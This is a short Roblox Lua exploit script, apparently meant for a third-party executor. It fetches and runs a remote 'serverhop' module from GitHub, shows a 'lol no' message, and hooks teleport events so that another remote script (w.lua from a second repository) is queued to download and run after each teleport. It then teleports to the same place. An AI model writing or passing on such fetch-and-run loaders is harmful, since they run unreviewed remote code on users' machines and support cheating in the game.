repeat wait() until game:IsLoaded()
local module = loadstring(game:HttpGet"https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
Instance.new("Message", workspace).Text = "lol no"
game.Players.LocalPlayer.OnTeleport:Connect(function(State)
    queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/denherst/shiny-train/main/w.lua"))()')
end)  

task.wait(10)

module:Teleport(game.PlaceId)
